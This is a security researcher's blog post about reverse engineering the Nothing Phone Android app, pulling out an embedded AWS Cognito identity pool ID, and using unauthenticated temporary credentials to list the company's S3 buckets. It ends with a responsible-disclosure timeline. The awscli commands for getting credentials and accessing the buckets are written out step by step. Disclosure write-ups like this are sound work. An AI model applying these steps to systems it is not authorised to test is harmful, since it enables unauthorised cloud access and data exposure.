---
layout: post
title:  "Hacking Nothing! Unauthorised access to Nothing’s AWS S3 Buckets"
date:   2025-07-23 22:45:31 +0530
categories: blog
---

Hi! In this blog i will talk about how I got access to Nothing Phone's S3 Buckets.

# Introduction

In this writeup I will share how I exploited a misconfiguration in Nothing’s AWS Cognito permissions to access the AWS S3 buckets of Nothing Mobile.

The flow includes how I reverse engineered android app and searched for the AWS Cognito resource and exploited the misconfiguration in the Cognito’s permission.

I hope you will learn something new today ;)

# What is AWS Cognito?

> From Google: "AWS Cognito is a service that provides user authentication, authorization, and user management for web and mobile applications. It simplifies the process of adding user sign-up, sign-in, and access control to applications by handling the complexities of user data storage, security, and integration with other AWS services."

So, it is a one of AWS service which simplifies user authentication, authorization, and user management for web and mobile applications.

# Reverse Engineering Nothing’s app

The first thing to do for Android pentesting is to reverse engineer the app and get decompiled java source code.

For this I used the [jadx-gui](https://github.com/skylot/jadx) tool to decompile the app and started my security testing on the app.

A simple search for “amazonaws” reveals several amazonaws.* services referenced in the app.

Searching for “import com.amazonaws.auth.AWSCredentialsProvider” reveals “a.a.a.a.c” java class file.

<figure>
  <img style="display:block; margin-left: auto; margin-right: auto" src="/assets/aws-search-image.png">
</figure>

Opening the class file and reading the source code, the code fetches Base64 texts from another class “C0000a” and decodes the Base64 and converts it into strings for AWSConfiguration.

See code:

```java
public static final String f = "c";
    public static final String g = "Default";
    public static final AWSConfiguration h = new AWSConfiguration(new String(EncodingSchemeEnum.BASE64.decode(C0000a.f131a.toString())), g);
    public static final AWSConfiguration i = new AWSConfiguration(new String(EncodingSchemeEnum.BASE64.decode(C0000a.b.toString())), g);
    public static volatile c j;
```

Opening the “C0000a” class file we actually got the base64 encoded strings which are used by AWSConfiguration.

<img src="/assets/code-image.png">

Decoding the base64 encoded texts we got the Identity “PoolId” and region.

<img src="/assets/cognito-image.png">

So, we got the Cognito PoolId and Region and what’s next?

# AWS Cognito Misconfiguration

This [research](https://www.yassineaboukir.com/talks/NahamConEU2022.pdf) by Yassine Aboukir played an important role in exploiting the AWS Cognito Misconfiguration.


Using the given PoolId and Region, we can get temporary aws credentials.

Use <b>awscli</b> by these commands:

```bash
aws cognito-identity get-id — identity-pool-id eu-central-1:c4d0a9-aafe-shs-ABC-REDACTED — region eu-central-1
```

It returns temporary aws credentials:

```
{
    "IdentityId": "eu-central-1:c4d0a9-aafe-shs-xxx-REDACTED",
    "Credentials": {
        "AccessKeyId": "ASIAREDACTED",
        "SecretKey": "ELPsWREDACTED",
        "SessionToken": "IQoJbREDACCTED",
        "Expiration": "2024-08-11T00:11:43+05:30"
    }
}
```

Now we can use this credentials to access Nothing’s AWS buckets by the use of these commands:

```bash
export AWS_ACCESS_KEY_ID=ASIAREDACTED
export AWS_SECRET_ACCESS_KEY=ELPsWREDACTED
export AWS_SESSION_TOKEN=”IQoJbREDACCTED”
```
Now list S3 buckets by using this command:

```bash
aws s3 ls
```

The output is:

```bash
2024–04–26 12:18:03 aws-glue-assets-****-eu-north-1
2023–09–05 13:39:26 ****-nothing-***e
2022–04–29 12:02:52 ****-log-fr***
2023–12–08 14:26:40 lamda2*****
2022–11–11 08:22:44 ***is-***-nothing
2024–04–25 13:32:32 nothing-**t
2023–10–11 10:03:01 nothing-13*-***
2022–12–29 15:01:01 nothing-ec****1
2024–04–25 13:43:42 nothing-***-***-india
2023–11–08 14:21:49 nothing-***-***test
2023–03–07 13:16:51 nothing****llect****furt
2023–12–14 08:19:17 system-log-n***s-i**-s**
2023–11–14 08:32:01 system-log-***-proc***
2023–11–28 09:02:14 system-log-a*****-to-in****
```

We got access to the nothing’s AWS S3 buckets and can do anything on these buckets ;)

# Responsible Disclosure

I notified the Nothing’s Security team by their official email: g_feedback@nothing.tech as per their official Security Vulnerability Report page at https://in.nothing.tech/pages/vulnerability-report

## Timeline:

- 11/08/2024 - Sent mail to the Security team with all the details
- 11/08/2024 - Automated reply received.
- 19/08/2024 - Sent a reply mail to ask for response from the team, No response received.
- 13/09/2024 - The AWS misconfiguration fixed without any update.

Listing buckets now returns this error:
```bash
An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:sts::5235XXXXXXX:assumed-role/Cognito_logCollectIdentityEuUnauth_Role/CognitoIdentityCredentials is not authorized to perform: s3:ListAllMyBuckets because no identity-based policy allows the s3:ListAllMyBuckets action
```

- 23/07/2025 - Blog published with redacted info.
